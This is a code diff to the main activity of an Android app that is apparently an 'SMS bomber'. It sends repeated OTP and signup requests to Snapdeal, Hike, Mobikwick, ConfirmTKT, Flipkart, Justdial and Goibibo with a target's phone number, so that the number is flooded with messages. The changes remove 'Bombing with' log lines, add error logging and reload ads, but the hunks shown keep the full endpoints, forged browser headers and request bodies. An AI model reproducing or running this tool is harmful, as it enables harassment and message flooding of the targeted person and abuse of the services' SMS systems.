@@ -14,6 +14,7 @@ import android.provider.ContactsContract;
 import android.support.v7.app.AppCompatActivity;
 import android.text.Html;
 import android.text.TextUtils;
+import android.text.method.ScrollingMovementMethod;
 import android.util.Log;
 import android.view.Menu;
 import android.view.MenuInflater;
@@ -109,7 +110,7 @@ public class HomeActivity extends AppCompatActivity {
                 .show();
 
         AdView adView = findViewById(R.id.mainBottomBannerAd);
-        AdRequest adRequest1 = new AdRequest.Builder().build();
+        final AdRequest adRequest1 = new AdRequest.Builder().build();
         adView.loadAd(adRequest1);
 
         AdView adView1 = findViewById(R.id.mainTopBannerAd);
@@ -129,6 +130,8 @@ public class HomeActivity extends AppCompatActivity {
         mLogTV = findViewById(R.id.logTV);
 
         mLog = mLogTV.getText().toString();
+        mLogTV.setMovementMethod(new ScrollingMovementMethod());
+
 
         findViewById(R.id.mainOkBtn).setOnClickListener(new View.OnClickListener() {
             @Override
@@ -187,7 +190,8 @@ public class HomeActivity extends AppCompatActivity {
 
             @Override
             public void onAdFailedToLoad(int errorCode) {
-                addLog("#FF0000", "Error : " + errorCode);
+                addLog("#FF0000", "Errorcode : " + errorCode);
+                interstitialAd.loadAd(adRequest);
             }
 
             @Override
@@ -264,7 +268,6 @@ public class HomeActivity extends AppCompatActivity {
                             public void run() {
                                 if (code == 200) {
                                     mStatusTV.setText("Snapdeal");
-                                    addLog("00AA00", "Bombing with Snapdeal");
                                 }
                             }
                         });
@@ -317,7 +320,6 @@ public class HomeActivity extends AppCompatActivity {
                                 mStatusTV.setText("Hike");
                                 if (code == 200) {
                                     mStatusTV.setText("Snapdeal");
-                                    addLog("00AA00", "Bombing with Hike");
                                 }
                             }
                         });
@@ -372,7 +374,6 @@ public class HomeActivity extends AppCompatActivity {
                                     mStatusTV.setText("Mobikwick");
                                     if (code == 200) {
                                         mStatusTV.setText("Snapdeal");
-                                        addLog("00AA00", "Bombing with Mobikwick");
                                     }
                                 }
                             });
@@ -418,8 +419,6 @@ public class HomeActivity extends AppCompatActivity {
                             webView.loadUrl("https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + mPhoneNumber);
                             webView.setWebViewClient(new WebViewClient());
                             mStatusTV.setText("ConfirmTKT");
-                            addLog("00FF00", "Bombing with ConfirmTKT");
-
                         }
                     });
 
@@ -458,12 +457,12 @@ public class HomeActivity extends AppCompatActivity {
                     RequestBody localRequestBody = RequestBody.create(localMediaType, "{\"loginId\":[\"+91" + mPhoneNumber + "\"],\"supportAllStates\":true}");
                     localOkHttpClient.newCall(new Request.Builder().url("https://www.flipkart.com/api/6/user/signup/status").post(localRequestBody).addHeader("host", "www.flipkart.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "*/*").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.flipkart.com/").addHeader("x-user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop").addHeader("content-type", "application/json").addHeader("origin", "https://www.flipkart.com").addHeader("content-length", "53").addHeader("connection", "keep-alive").build()).enqueue(new Callback()
                     {
-                        public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {}
+                        public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+                            addLog("#FF0000","At flipkart: "+paramAnonymousIOException.getLocalizedMessage());
+                        }
 
                         public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse)
-                        {
-                            addLog("#00FF00","Flipkart: "+paramAnonymousResponse.message());
-                        }
+                        {}
                     });
 
                 }
@@ -499,16 +498,12 @@ public class HomeActivity extends AppCompatActivity {
                     String str = "https://www.justdial.com/functions/ajxandroid.php?phn=" + mPhoneNumber + "&em=e.g.+abc%40xyz.com&vcode=-&type=1&applink=aib&apppage=jdmpage&pageName=jd_on_mobile";
                     new OkHttpClient().newCall(new Request.Builder().url(str).addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36").build()).enqueue(new Callback()
                     {
-                        public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {}
+                        public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+                            addLog("#FF0000","At justdial: "+paramAnonymousIOException.getLocalizedMessage());
+                        }
 
                         public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse)
-                        {
-                            try {
-                                addLog("#00FF00","Justdial: "+paramAnonymousResponse.body().string());
-                            } catch (IOException e) {
-                                e.printStackTrace();
-                            }
-                        }
+                        {}
                     });
 
                 }
@@ -544,16 +539,12 @@ public class HomeActivity extends AppCompatActivity {
                     RequestBody localRequestBody1 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mbl=" + mPhoneNumber);
                     localOkHttpClient1.newCall(new Request.Builder().url("https://www.goibibo.com/common/downloadsms/").post(localRequestBody1).addHeader("host", "www.goibibo.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.goibibo.com/mobile/?sms=success").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("content-length", "14").addHeader("connection", "keep-alive").addHeader("upgrade-insecure-requests", "1").build()).enqueue(new Callback()
                     {
-                        public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {}
+                        public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+                            addLog("#FF0000","At goibibo: "+paramAnonymousIOException.getLocalizedMessage());
+                        }
 
                         public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse)
-                        {
-                            try {
-                                addLog("#00FF00","Goibibo: "+paramAnonymousResponse.body().string());
-                            } catch (IOException e) {
-                                e.printStackTrace();
-                            }
-                        }
+                        {}
                     });
 
 
